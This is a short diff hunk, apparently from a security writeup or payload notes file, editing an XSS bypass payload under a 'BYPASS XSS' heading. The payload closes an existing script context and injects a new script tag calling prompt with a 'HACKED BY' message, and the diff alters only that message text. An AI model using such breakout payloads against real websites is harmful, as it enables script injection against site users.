@@ -167,7 +167,7 @@ a.send();
 BYPASS XSS 
 
 ```
-1'});});<​/script><​script>prompt("HACKED BY \nKUCINGPINTAR")<​/script>
+1'});});<​/script><​script>prompt("HACKED BY \ted")<​/script>
 ```
 <img width="883" height="250" alt="image" src="https://github.com/user-attachments/assets/d3d42f85-80b4-4b4e-9b7f-4f1248a4597b" />
 
